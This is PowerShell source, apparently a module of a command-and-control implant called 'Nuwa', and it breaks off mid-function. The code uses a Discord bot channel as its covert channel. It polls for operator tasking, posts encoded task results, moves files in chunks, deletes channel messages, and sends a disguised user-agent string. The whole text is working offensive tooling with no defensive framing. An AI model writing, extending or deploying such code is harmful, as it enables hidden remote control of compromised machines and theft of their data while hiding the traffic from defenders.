function Get-NuwaDiscordUserAgent {
    [CmdletBinding()]
    param()

    return 'StatusClient/1.0'
}

function Get-NuwaDiscordApiHeaders {
    [CmdletBinding()]
    param()

    return @{
        Authorization = ('Bot {0}' -f $script:NuwaConfig.DiscordToken)
        'User-Agent' = Get-NuwaDiscordUserAgent
    }
}

function Get-NuwaDiscordMessagesUri {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [int]$Limit = 100,

        [Parameter(Mandatory = $false)]
        [string]$AfterMessageId = ''
    )

    $uri = ('https://discord.com/api/v10/channels/{0}/messages?limit={1}' -f $script:NuwaConfig.BotChannel, $Limit)
    if (-not [string]::IsNullOrWhiteSpace($AfterMessageId)) {
        $uri = ('{0}&after={1}' -f $uri, [System.Uri]::EscapeDataString($AfterMessageId))
    }
    return $uri
}

function Get-NuwaDiscordChannelUri {
    [CmdletBinding()]
    param()

    return ('https://discord.com/api/v10/channels/{0}/messages' -f $script:NuwaConfig.BotChannel)
}

function ConvertTo-NuwaDiscordMessageWrapper {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message,

        [Parameter(Mandatory = $true)]
        [string]$SenderId,

        [Parameter(Mandatory = $true)]
        [bool]$ToServer
    )

    $wrapper = @{
        message = $Message
        sender_id = $SenderId
        to_server = $ToServer
        id = 1
        final = $true
    }
    $wrapper = Add-NuwaDiscordMessageFormat -Wrapper $wrapper
    $envelopeCodec = if (
        $script:NuwaConfig -and
        -not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.DiscordEnvelopeCodec)
    ) {
        [string]$script:NuwaConfig.DiscordEnvelopeCodec
    } else {
        'legacy-json'
    }
    if ($envelopeCodec -eq 'legacy-json') {
        return ($wrapper | ConvertTo-Json -Compress -Depth 10)
    }
    $context = @{
        direction = if ($ToServer) { 'agent-to-server' } else { 'server-to-agent' }
        sender_id = $SenderId
        client_id = ''
        c2_profile = 'discord'
        envelope_codec = $envelopeCodec
        envelope_version = 1
    }
    return ConvertTo-NuwaDiscordEnvelopeText `
        -Wrapper $wrapper `
        -CodecProfile $envelopeCodec `
        -Context $context
}

function ConvertFrom-NuwaDiscordJsonObject {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Value
    )

    if ([string]::IsNullOrWhiteSpace($Value)) {
        return $null
    }

    try {
        return ($Value | ConvertFrom-Json)
    } catch {
        return $null
    }
}

function ConvertFrom-NuwaDiscordContent {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [AllowNull()]
        [object]$Content
    )

    if ($null -eq $Content) {
        return ''
    }

    if ($Content -is [string]) {
        return [string]$Content
    }

    if ($Content -is [byte[]]) {
        return [System.Text.Encoding]::UTF8.GetString($Content)
    }

    if ($Content -is [Array]) {
        return [System.Text.Encoding]::UTF8.GetString([byte[]]$Content)
    }

    return [string]$Content
}

function Get-NuwaDiscordRateLimitDelayMilliseconds {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [AllowNull()]
        [object]$ErrorRecord = $null,

        [Parameter(Mandatory = $false)]
        [string]$ResponseContent = '',

        [Parameter(Mandatory = $false)]
        [int]$StatusCode = 0
    )

    $payloadJson = ''
    if (-not [string]::IsNullOrWhiteSpace($ResponseContent)) {
        $payloadJson = $ResponseContent
    } elseif ($null -ne $ErrorRecord) {
        if (
            $ErrorRecord.PSObject.Properties.Match('ErrorDetails').Count -gt 0 -and
            $null -ne $ErrorRecord.ErrorDetails -and
            -not [string]::IsNullOrWhiteSpace([string]$ErrorRecord.ErrorDetails.Message)
        ) {
            $payloadJson = [string]$ErrorRecord.ErrorDetails.Message
        } elseif (
            $ErrorRecord.PSObject.Properties.Match('Exception').Count -gt 0 -and
            $null -ne $ErrorRecord.Exception -and
            -not [string]::IsNullOrWhiteSpace([string]$ErrorRecord.Exception.Message)
        ) {
            $exceptionMessage = [string]$ErrorRecord.Exception.Message
            $jsonMatch = [regex]::Match($exceptionMessage, '\{.*\}')
            if ($jsonMatch.Success) {
                $payloadJson = $jsonMatch.Value
            }
        }
    }

    $payload = $null
    if (-not [string]::IsNullOrWhiteSpace($payloadJson)) {
        $payload = ConvertFrom-NuwaDiscordJsonObject -Value $payloadJson
    }

    $resolvedStatusCode = $StatusCode
    if ($resolvedStatusCode -eq 0 -and $null -ne $ErrorRecord) {
        try {
            if ($ErrorRecord.Exception -and $ErrorRecord.Exception.Response) {
                $resolvedStatusCode = [int]$ErrorRecord.Exception.Response.StatusCode
            }
        } catch {
            $resolvedStatusCode = 0
        }
    }
    if ($resolvedStatusCode -eq 0 -and $null -ne $payload -and $payload.PSObject.Properties.Match('retry_after').Count -gt 0) {
        $resolvedStatusCode = 429
    }

    if ($resolvedStatusCode -eq 0 -and $null -ne $ErrorRecord -and $ErrorRecord.Exception) {
        $exception = $ErrorRecord.Exception
        for ($exceptionDepth = 0; $null -ne $exception -and $exceptionDepth -lt 8; $exceptionDepth += 1) {
            if ($exception -is [System.Net.WebException]) {
                $transientWebStatuses = @(
                    [System.Net.WebExceptionStatus]::NameResolutionFailure,
                    [System.Net.WebExceptionStatus]::ProxyNameResolutionFailure
                )
                if ($transientWebStatuses -contains $exception.Status) {
                    return 1100
                }
            }

            $exceptionMessage = [string]$exception.Message
            if (
                $exceptionMessage -match
                    '(?i)(unexpected EOF|0 bytes from the transport stream|operation has timed out|underlying connection was closed|connection was forcibly closed|unexpected error occurred on a send|remote name could not be resolved|no such host is known|name or service not known)'
            ) {
                return 1100
            }
            $exception = $exception.InnerException
        }
    }

    if ($resolvedStatusCode -in @(500, 502, 503, 504)) {
        return 1100
    }

    if ($resolvedStatusCode -ne 429) {
        return -1
    }

    $retryAfterSeconds = 1.0
    if ($null -ne $payload -and $payload.PSObject.Properties.Match('retry_after').Count -gt 0) {
        try {
            $retryAfterSeconds = [double]$payload.retry_after
        } catch {
            $retryAfterSeconds = 1.0
        }
    }

    return [int][Math]::Ceiling(($retryAfterSeconds * 1000.0) + 100.0)
}

function Invoke-NuwaDiscordWebRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [hashtable]$InvokeParameters,

        [Parameter(Mandatory = $false)]
        [int]$MaxAttempts = 5
    )

    if (-not $InvokeParameters.ContainsKey('TimeoutSec')) {
        $InvokeParameters.TimeoutSec = 30
    }
    if (-not $InvokeParameters.ContainsKey('DisableKeepAlive')) {
        $InvokeParameters.DisableKeepAlive = $true
    }

    for ($attempt = 0; $attempt -lt $MaxAttempts; $attempt += 1) {
        try {
            return Invoke-WebRequest @InvokeParameters
        } catch {
            $delayMilliseconds = Get-NuwaDiscordRateLimitDelayMilliseconds -ErrorRecord $_
            if ($delayMilliseconds -lt 0 -or ($attempt + 1) -ge $MaxAttempts) {
                throw
            }
            Start-Sleep -Milliseconds $delayMilliseconds
        }
    }

    throw 'Discord API request exceeded retry attempts'
}

function Get-NuwaDiscordAttachmentContent {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Url
    )

    try {
        Add-Type -AssemblyName 'System.Net.Http' -ErrorAction Stop | Out-Null
    } catch {
    }

    for ($attempt = 0; $attempt -lt 5; $attempt += 1) {
        $handler = [System.Net.Http.HttpClientHandler]::new()
        Set-NuwaDiscordAttachmentProxy -Handler $handler
        $client = [System.Net.Http.HttpClient]::new($handler)
        $client.Timeout = [TimeSpan]::FromSeconds(30)
        $response = $null
        $stream = $null
        try {
            $response = $client.GetAsync(
                $Url,
                [System.Net.Http.HttpCompletionOption]::ResponseHeadersRead
            ).GetAwaiter().GetResult()
            $delayMilliseconds = Get-NuwaDiscordRateLimitDelayMilliseconds `
                -StatusCode ([int]$response.StatusCode)
            if ($delayMilliseconds -ge 0 -and ($attempt + 1) -lt 5) {
                Start-Sleep -Milliseconds $delayMilliseconds
                continue
            }
            $response.EnsureSuccessStatusCode() | Out-Null

            $contentLength = $response.Content.Headers.ContentLength
            if ($null -ne $contentLength -and [long]$contentLength -gt 2097152) {
                throw 'Discord envelope attachment exceeds the UTF-8 byte limit'
            }
            $stream = $response.Content.ReadAsStreamAsync().GetAwaiter().GetResult()
            return Read-NuwaDiscordBoundedAttachmentStream `
                -Stream $stream `
                -MaximumBytes 2097152
        } catch {
            $delayMilliseconds = Get-NuwaDiscordRateLimitDelayMilliseconds -ErrorRecord $_
            if ($delayMilliseconds -lt 0 -or ($attempt + 1) -ge 5) {
                throw
            }
            Start-Sleep -Milliseconds $delayMilliseconds
        } finally {
            if ($null -ne $stream) {
                $stream.Dispose()
            }
            if ($null -ne $response) {
                $response.Dispose()
            }
            $client.Dispose()
            $handler.Dispose()
        }
    }

    throw 'Discord attachment request exceeded retry attempts'
}

function Read-NuwaDiscordBoundedAttachmentStream {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [System.IO.Stream]$Stream,

        [Parameter(Mandatory = $false)]
        [int]$MaximumBytes = 2097152
    )

    if ($MaximumBytes -lt 0) {
        throw 'Discord envelope attachment byte limit is invalid'
    }

    $destination = [System.IO.MemoryStream]::new()
    try {
        $buffer = [byte[]]::new(8192)
        while ($true) {
            $remaining = $MaximumBytes - [int]$destination.Length
            $readLength = [Math]::Min($buffer.Length, $remaining + 1)
            $count = $Stream.Read($buffer, 0, $readLength)
            if ($count -eq 0) {
                break
            }
            if ($count -gt $remaining) {
                throw 'Discord envelope attachment exceeds the UTF-8 byte limit'
            }
            $destination.Write($buffer, 0, $count)
        }
        return ConvertFrom-NuwaUtf8Bytes -Bytes $destination.ToArray()
    } finally {
        $destination.Dispose()
    }
}

function ConvertFrom-NuwaDiscordMessage {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message
    )

    $value = ''
    if ($Message -is [string]) {
        $value = $Message
    }

    $content = $null
    $attachments = $null
    if ($Message -is [hashtable]) {
        if ($Message.ContainsKey('content')) {
            $content = $Message['content']
        }
        if ($Message.ContainsKey('attachments')) {
            $attachments = $Message['attachments']
        }
    } else {
        if ($Message.PSObject.Properties.Match('content').Count -gt 0) {
            $content = $Message.content
        }
        if ($Message.PSObject.Properties.Match('attachments').Count -gt 0) {
            $attachments = $Message.attachments
        }
    }

    if ([string]::IsNullOrWhiteSpace($value) -and -not [string]::IsNullOrWhiteSpace([string]$content)) {
        $value = [string]$content
    }

    if ([string]::IsNullOrWhiteSpace($value) -and $attachments -and $attachments.Count -gt 0) {
        $attachment = $attachments[0]
        if ($attachment -and $attachment.url) {
            $value = Get-NuwaDiscordAttachmentContent -Url ([string]$attachment.url)
        }
    }

    if ([string]::IsNullOrWhiteSpace($value)) {
        return $null
    }
    if (-not (Get-Command Resolve-NuwaDiscordEnvelopeText -ErrorAction SilentlyContinue)) {
        return ConvertFrom-NuwaDiscordJsonObject -Value $value
    }
    try {
        $resolved = Resolve-NuwaDiscordEnvelopeText -Value $value -Context @{
            direction = 'server-to-agent'
            sender_id = ''
            client_id = ''
            c2_profile = 'discord'
            envelope_codec = ''
            envelope_version = 1
        }
        $parsed = $resolved.Wrapper
        $parsed | Add-Member -NotePropertyName '_nuwa_envelope_codec' -NotePropertyValue $resolved.CodecProfile -Force
        $parsed | Add-Member -NotePropertyName '_nuwa_envelope_encoded' -NotePropertyValue ([bool]$resolved.IsEncoded) -Force
        return $parsed
    } catch {
        return $null
    }
}

function Get-NuwaDiscordObjectProperty {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [AllowNull()]
        [object]$Object,

        [Parameter(Mandatory = $true)]
        [string]$Name
    )

    if ($null -eq $Object) {
        return $null
    }

    if ($Object -is [hashtable]) {
        if ($Object.ContainsKey($Name)) {
            return $Object[$Name]
        }
        return $null
    }

    if ($Object.PSObject.Properties.Match($Name).Count -gt 0) {
        return $Object.$Name
    }

    return $null
}

function ConvertFrom-NuwaDiscordWireBody {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$WireBody,

        [Parameter(Mandatory = $true)]
        [string]$Uuid,

        [Parameter(Mandatory = $true)]
        [string]$Action,

        [Parameter(Mandatory = $false)]
        [string]$Direction = 'outbound'
    )

    if ([string]::IsNullOrWhiteSpace($WireBody)) {
        return $null
    }

    $context = @{
        direction = $Direction
        uuid = $Uuid
        message_type = $Action
        c2_profile = if (-not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.C2Profile)) {
            [string]$script:NuwaConfig.C2Profile
        } else {
            'discord'
        }
        codec_profile = if (-not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.CodecProfile)) {
            [string]$script:NuwaConfig.CodecProfile
        } else {
            'decimal'
        }
        codec_version = '1'
    }
    $uuidLength = if ($script:NuwaConfig.MessageUuidLength) {
        [int]$script:NuwaConfig.MessageUuidLength
    } else {
        36
    }

    try {
        $decodedJson = ConvertFrom-NuwaWireBytes `
            -WireBytes (ConvertTo-NuwaUtf8Bytes -Value $WireBody) `
            -Context $context
        if ([string]::IsNullOrWhiteSpace($decodedJson)) {
            return $null
        }

        return ConvertFrom-NuwaDiscordJsonObject -Value $decodedJson
    } catch {
        return $null
    }
}

function Test-NuwaDiscordResponseMatchesRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message,

        [Parameter(Mandatory = $false)]
        [AllowNull()]
        [object]$ExpectedRequest = $null,

        [Parameter(Mandatory = $false)]
        [string]$ExpectedAction = ''
    )

    if ($null -eq $ExpectedRequest -or $ExpectedAction -ne 'post_response') {
        return $true
    }

    $messageResponse = Get-NuwaDiscordObjectProperty -Object $Message -Name '_nuwa_decoded_body'
    if ($null -eq $messageResponse) {
        return $true
    }

    $requestResponses = @(Get-NuwaDiscordObjectProperty -Object $ExpectedRequest -Name 'responses')
    $messageResponses = @(Get-NuwaDiscordObjectProperty -Object $messageResponse -Name 'responses')
    if ($requestResponses.Count -eq 0 -or $messageResponses.Count -eq 0) {
        return $true
    }

    $requestEntry = $requestResponses[0]
    $messageEntry = $messageResponses[0]
    if ($null -eq $requestEntry -or $null -eq $messageEntry) {
        return $true
    }

    $requestTaskId = [string](Get-NuwaDiscordObjectProperty -Object $requestEntry -Name 'task_id')
    $messageTaskId = [string](Get-NuwaDiscordObjectProperty -Object $messageEntry -Name 'task_id')
    if (
        -not [string]::IsNullOrWhiteSpace($requestTaskId) -and
        -not [string]::IsNullOrWhiteSpace($messageTaskId) -and
        $requestTaskId -ne $messageTaskId
    ) {
        return $false
    }

    $requestUpload = Get-NuwaDiscordObjectProperty -Object $requestEntry -Name 'upload'
    if ($null -ne $requestUpload) {
        $requestChunkNum = Get-NuwaDiscordObjectProperty -Object $requestUpload -Name 'chunk_num'
        $messageChunkNum = Get-NuwaDiscordObjectProperty -Object $messageEntry -Name 'chunk_num'
        if ($null -ne $requestChunkNum -and $null -ne $messageChunkNum -and [int]$requestChunkNum -ne [int]$messageChunkNum) {
            return $false
        }

        $requestFileId = [string](Get-NuwaDiscordObjectProperty -Object $requestUpload -Name 'file_id')
        $messageFileId = [string](Get-NuwaDiscordObjectProperty -Object $messageEntry -Name 'file_id')
        if (
            -not [string]::IsNullOrWhiteSpace($requestFileId) -and
            -not [string]::IsNullOrWhiteSpace($messageFileId) -and
            $requestFileId -ne $messageFileId
        ) {
            return $false
        }
    }

    $requestDownload = Get-NuwaDiscordObjectProperty -Object $requestEntry -Name 'download'
    if ($null -ne $requestDownload) {
        $requestChunkNum = Get-NuwaDiscordObjectProperty -Object $requestDownload -Name 'chunk_num'
        $messageChunkNum = Get-NuwaDiscordObjectProperty -Object $messageEntry -Name 'chunk_num'
        if ($null -ne $requestChunkNum -and $null -ne $messageChunkNum -and [int]$requestChunkNum -ne [int]$messageChunkNum) {
            return $false
        }

        $requestFileId = [string](Get-NuwaDiscordObjectProperty -Object $requestDownload -Name 'file_id')
        $messageFileId = [string](Get-NuwaDiscordObjectProperty -Object $messageEntry -Name 'file_id')
        if (
            -not [string]::IsNullOrWhiteSpace($requestFileId) -and
            -not [string]::IsNullOrWhiteSpace($messageFileId) -and
            $requestFileId -ne $messageFileId
        ) {
            return $false
        }
    }

    return $true
}

function Find-NuwaDiscordInboundMessage {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [AllowNull()]
        [AllowEmptyCollection()]
        [object[]]$Messages,

        [Parameter(Mandatory = $true)]
        [string]$ExpectedClientId,

        [Parameter(Mandatory = $false)]
        [string[]]$AlternateClientIds = @(),

        [Parameter(Mandatory = $false)]
        [string]$ExpectedAction = '',

        [Parameter(Mandatory = $false)]
        [string]$ExpectedUuid = '',

        [Parameter(Mandatory = $false)]
        [DateTimeOffset]$MinimumTimestamp = [DateTimeOffset]::MinValue,

        [Parameter(Mandatory = $false)]
        [AllowNull()]
        [object]$ExpectedRequest = $null
    )

    if ($null -eq $Messages) {
        return $null
    }

    $candidates = @()
    $requestMatchedCandidates = @()
    foreach ($message in $Messages) {
        $messageId = Get-NuwaDiscordMessageId -Message $message
        if (
            -not [string]::IsNullOrWhiteSpace($messageId) -and
            $script:NuwaDiscordProcessedMessageIds -and
            ($script:NuwaDiscordProcessedMessageIds -contains $messageId)
        ) {
            continue
        }
        if (-not (Test-NuwaDiscordMessageTimestamp -Message $message -MinimumTimestamp $MinimumTimestamp)) {
            continue
        }
        $parsed = ConvertFrom-NuwaDiscordMessage -Message $message
        if ($null -eq $parsed) {
            continue
        }
        if ($parsed.to_server) {
            continue
        }
        $targetClientId = if ($parsed.PSObject.Properties.Match('client_id').Count -gt 0) {
            [string]$parsed.client_id
        } else {
            [string]$parsed.sender_id
        }
        $acceptedClientIds = @($ExpectedClientId)
        foreach ($alternateClientId in $AlternateClientIds) {
            if (-not [string]::IsNullOrWhiteSpace([string]$alternateClientId)) {
                $acceptedClientIds += [string]$alternateClientId
            }
        }
        $decodedMatchesExpected = $false
        if (-not [string]::IsNullOrWhiteSpace($ExpectedAction)) {
            $decodeCandidates = @()
            if (-not [string]::IsNullOrWhiteSpace($ExpectedUuid)) {
                $decodeCandidates += $ExpectedUuid
            }
            foreach ($acceptedClientId in $acceptedClientIds) {
                if (-not [string]::IsNullOrWhiteSpace([string]$acceptedClientId)) {
                    $decodeCandidates += [string]$acceptedClientId
                }
            }
            if (-not [string]::IsNullOrWhiteSpace($targetClientId)) {
                $decodeCandidates += $targetClientId
            }
            if ($parsed.PSObject.Properties.Match('sender_id').Count -gt 0 -and -not [string]::IsNullOrWhiteSpace([string]$parsed.sender_id)) {
                $decodeCandidates += [string]$parsed.sender_id
            }

            $parsedMessageBody = if ($parsed.PSObject.Properties.Match('message').Count -gt 0) {
                [string]$parsed.message
            } else {
                ''
            }
            $resolvedBody = $null
            if ($ExpectedAction -eq 'post_response' -and [string]::IsNullOrWhiteSpace($parsedMessageBody)) {
                $acknowledgementUuid = if (-not [string]::IsNullOrWhiteSpace($ExpectedUuid)) {
                    $ExpectedUuid
                } else {
                    $targetClientId
                }
                $acknowledgementJson = '{"action":"post_response","responses":[]}'
                $acknowledgementContext = @{
                    direction = 'inbound'
                    uuid = $acknowledgementUuid
                    message_type = 'post_response'
                    c2_profile = if (-not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.C2Profile)) {
                        [string]$script:NuwaConfig.C2Profile
                    } else {
                        'discord'
                    }
                    codec_profile = if (-not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.CodecProfile)) {
                        [string]$script:NuwaConfig.CodecProfile
                    } else {
                        'decimal'
                    }
                    codec_version = '1'
                }
                $resolvedBody = @{
                    Decoded = ConvertFrom-NuwaDiscordJsonObject -Value $acknowledgementJson
                    Uuid = $acknowledgementUuid
                    WireBody = ConvertFrom-NuwaUtf8Bytes -Bytes (
                        ConvertTo-NuwaWireBytes `
                            -MessageJson $acknowledgementJson `
                            -Context $acknowledgementContext
                    )
                }
            } else {
                $resolvedBody = Resolve-NuwaDiscordDecodedBody `
                    -Message $parsed `
                    -ExpectedAction $ExpectedAction `
                    -CandidateUuids $decodeCandidates
            }
            if ($null -eq $resolvedBody) {
                continue
            }
            if (
                $resolvedBody.Decoded.PSObject.Properties.Match('action').Count -gt 0 -and
                [string]$resolvedBody.Decoded.action -ne $ExpectedAction
            ) {
                continue
            }
            $parsed | Add-Member -NotePropertyName '_nuwa_decoded_body' -NotePropertyValue $resolvedBody.Decoded -Force
            $parsed | Add-Member -NotePropertyName '_nuwa_wire_body' -NotePropertyValue $resolvedBody.WireBody -Force
            $parsed | Add-Member -NotePropertyName '_nuwa_decode_uuid' -NotePropertyValue $resolvedBody.Uuid -Force
            $decodedMatchesExpected = $true
        }
        if (($acceptedClientIds -notcontains $targetClientId) -and -not $decodedMatchesExpected) {
            continue
        }
        if (-not [string]::IsNullOrWhiteSpace($messageId)) {
            $parsed | Add-Member -NotePropertyName '_discord_message_id' -NotePropertyValue $messageId -Force
        }
        $candidates += $parsed
        if (Test-NuwaDiscordResponseMatchesRequest -Message $parsed -ExpectedRequest $ExpectedRequest -ExpectedAction $ExpectedAction) {
            $requestMatchedCandidates += $parsed
        }
    }

    if ($ExpectedAction -eq 'get_tasking') {
        foreach ($candidate in $requestMatchedCandidates) {
            if (Test-NuwaDiscordMessageHasTasks -Message $candidate -ExpectedAction $ExpectedAction -ExpectedUuid $ExpectedUuid) {
                return $candidate
            }
        }
        foreach ($candidate in $candidates) {
            if (Test-NuwaDiscordMessageHasTasks -Message $candidate -ExpectedAction $ExpectedAction -ExpectedUuid $ExpectedUuid) {
                return $candidate
            }
        }
    }

    if ($requestMatchedCandidates.Count -gt 0) {
        return $requestMatchedCandidates[0]
    }

    if ($candidates.Count -gt 0) {
        return $candidates[0]
    }

    return $null
}

function Get-NuwaDiscordMessageId {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message
    )

    if ($Message -is [hashtable]) {
        if ($Message.ContainsKey('id')) {
            return [string]$Message['id']
        }
    } elseif ($Message.PSObject.Properties.Match('id').Count -gt 0) {
        return [string]$Message.id
    }

    return ''
}

function Test-NuwaDiscordMessageTimestamp {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message,

        [Parameter(Mandatory = $false)]
        [DateTimeOffset]$MinimumTimestamp = [DateTimeOffset]::MinValue
    )

    if ($MinimumTimestamp -eq [DateTimeOffset]::MinValue) {
        return $true
    }

    $timestampValue = $null
    if ($Message -is [hashtable]) {
        if ($Message.ContainsKey('timestamp')) {
            $timestampValue = $Message['timestamp']
        }
    } elseif ($Message.PSObject.Properties.Match('timestamp').Count -gt 0) {
        $timestampValue = $Message.timestamp
    }
    if ([string]::IsNullOrWhiteSpace([string]$timestampValue)) {
        return $false
    }

    try {
        return ([DateTimeOffset]::Parse([string]$timestampValue) -gt $MinimumTimestamp)
    } catch {
        return $false
    }
}

function Test-NuwaDiscordInboundMessageAction {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message,

        [Parameter(Mandatory = $true)]
        [string]$ExpectedAction,

        [Parameter(Mandatory = $false)]
        [string]$ExpectedUuid = ''
    )

    if ([string]::IsNullOrWhiteSpace($ExpectedAction)) {
        return $true
    }

    $decoded = ConvertFrom-NuwaDiscordDecodedBody -Message $Message -ExpectedAction $ExpectedAction -ExpectedUuid $ExpectedUuid
    if ($null -eq $decoded) {
        return $false
    }
    if ($decoded.PSObject.Properties.Match('action').Count -eq 0) {
        return $true
    }

    return ([string]$decoded.action -eq $ExpectedAction)
}

function ConvertFrom-NuwaDiscordDecodedBody {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message,

        [Parameter(Mandatory = $true)]
        [string]$ExpectedAction,

        [Parameter(Mandatory = $false)]
        [string]$ExpectedUuid = ''
    )

    $messageBody = if ($Message.PSObject.Properties.Match('message').Count -gt 0) {
        [string]$Message.message
    } else {
        ''
    }
    if ([string]::IsNullOrWhiteSpace($messageBody)) {
        return $null
    }

    if ($Message.PSObject.Properties.Match('_nuwa_decoded_body').Count -gt 0 -and $null -ne $Message._nuwa_decoded_body) {
        $cachedDecoded = $Message._nuwa_decoded_body
        if (
            $cachedDecoded.PSObject.Properties.Match('action').Count -eq 0 -or
            [string]$cachedDecoded.action -eq $ExpectedAction
        ) {
            return $cachedDecoded
        }
    }

    $uuid = if (-not [string]::IsNullOrWhiteSpace($ExpectedUuid)) {
        $ExpectedUuid
    } elseif ($Message.PSObject.Properties.Match('client_id').Count -gt 0) {
        [string]$Message.client_id
    } else {
        [string]$Message.sender_id
    }

    $context = @{
        direction = 'inbound'
        uuid = $uuid
        message_type = $ExpectedAction
        c2_profile = if (-not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.C2Profile)) {
            [string]$script:NuwaConfig.C2Profile
        } else {
            'discord'
        }
        codec_profile = if (-not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.CodecProfile)) {
            [string]$script:NuwaConfig.CodecProfile
        } else {
            'decimal'
        }
        codec_version = '1'
    }
    $uuidLength = if ($script:NuwaConfig.MessageUuidLength) {
        [int]$script:NuwaConfig.MessageUuidLength
    } else {
        36
    }

    try {
        $decodedJson = ConvertFrom-NuwaResponseBody `
            -ResponseBody $messageBody `
            -ExpectedUuid $uuid `
            -UuidLength $uuidLength `
            -Context $context
        if ([string]::IsNullOrWhiteSpace($decodedJson)) {
            return $null
        }

        return (ConvertFrom-NuwaDiscordJsonObject -Value $decodedJson)
    } catch {
        return $null
    }
}

function Resolve-NuwaDiscordDecodedBody {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message,

        [Parameter(Mandatory = $true)]
        [string]$ExpectedAction,

        [Parameter(Mandatory = $false)]
        [string[]]$CandidateUuids = @()
    )

    $messageBody = if ($Message.PSObject.Properties.Match('message').Count -gt 0) {
        [string]$Message.message
    } else {
        ''
    }
    if ([string]::IsNullOrWhiteSpace($messageBody)) {
        return $null
    }

    $uuidLength = if ($script:NuwaConfig.MessageUuidLength) {
        [int]$script:NuwaConfig.MessageUuidLength
    } else {
        36
    }

    $attemptedUuids = @()
    foreach ($candidateUuid in $CandidateUuids) {
        $candidate = [string]$candidateUuid
        if ([string]::IsNullOrWhiteSpace($candidate) -or ($attemptedUuids -contains $candidate)) {
            continue
        }
        $attemptedUuids += $candidate

        $context = @{
            direction = 'inbound'
            uuid = $candidate
            message_type = $ExpectedAction
            c2_profile = if (-not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.C2Profile)) {
                [string]$script:NuwaConfig.C2Profile
            } else {
                'discord'
            }
            codec_profile = if (-not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.CodecProfile)) {
                [string]$script:NuwaConfig.CodecProfile
            } else {
                'decimal'
            }
            codec_version = '1'
        }

        try {
            $resolved = Resolve-NuwaResponseBody `
                -ResponseBody $messageBody `
                -ExpectedUuid $candidate `
                -UuidLength $uuidLength `
                -Context $context
            if ($null -eq $resolved -or [string]::IsNullOrWhiteSpace([string]$resolved.Json)) {
                continue
            }

            $decoded = ConvertFrom-NuwaDiscordJsonObject -Value ([string]$resolved.Json)
            if ($null -eq $decoded) {
                continue
            }

            return @{
                Decoded = $decoded
                Uuid = [string]$resolved.Uuid
                WireBody = [string]$resolved.WireBody
            }
        } catch {
            continue
        }
    }

    return $null
}

function Test-NuwaDiscordMessageHasTasks {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message,

        [Parameter(Mandatory = $true)]
        [string]$ExpectedAction,

        [Parameter(Mandatory = $false)]
        [string]$ExpectedUuid = ''
    )

    $decoded = ConvertFrom-NuwaDiscordDecodedBody -Message $Message -ExpectedAction $ExpectedAction -ExpectedUuid $ExpectedUuid
    if ($null -eq $decoded) {
        return $false
    }
    if ($decoded.PSObject.Properties.Match('tasks').Count -eq 0) {
        return $false
    }
    if ($null -eq $decoded.tasks) {
        return $false
    }

    return ($decoded.tasks.Count -gt 0)
}

function Get-NuwaDiscordMessages {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [string]$AfterMessageId = ''
    )

    $invokeParameters = @{
        Uri = Get-NuwaDiscordMessagesUri -AfterMessageId $AfterMessageId
        Method = 'GET'
        Headers = Get-NuwaDiscordApiHeaders
        UseBasicParsing = $true
    }
    Set-NuwaDiscordProxyInvokeParameters -InvokeParameters $invokeParameters
    $response = Invoke-NuwaDiscordWebRequest -InvokeParameters $invokeParameters
    $rawContent = ConvertFrom-NuwaDiscordContent -Content $response.Content
    if ([string]::IsNullOrWhiteSpace($rawContent)) {
        return @()
    }
    $parsed = $rawContent | ConvertFrom-Json
    if ($null -eq $parsed) {
        return @()
    }
    return $parsed
}

function Remove-NuwaDiscordMessage {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$MessageId
    )

    $invokeParameters = @{
        Uri = ('{0}/{1}' -f (Get-NuwaDiscordChannelUri), $MessageId)
        Method = 'DELETE'
        Headers = Get-NuwaDiscordApiHeaders
        TimeoutSec = 5
        DisableKeepAlive = $true
        UseBasicParsing = $true
    }
    Set-NuwaDiscordProxyInvokeParameters -InvokeParameters $invokeParameters
    Invoke-NuwaDiscordWebRequest -InvokeParameters $invokeParameters -MaxAttempts 1 | Out-Null
}

function Send-NuwaDiscordApiJson {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Content
    )

    $invokeParameters = @{
        Uri = Get-NuwaDiscordChannelUri
        Method = 'POST'
        Headers = Get-NuwaDiscordApiHeaders
        Body = (@{ content = $Content } | ConvertTo-Json -Compress)
        ContentType = 'application/json'
        UseBasicParsing = $true
    }
    Set-NuwaDiscordProxyInvokeParameters -InvokeParameters $invokeParameters
    $response = Invoke-NuwaDiscordWebRequest -InvokeParameters $invokeParameters
    $content = ConvertFrom-NuwaDiscordContent -Content $response.Content
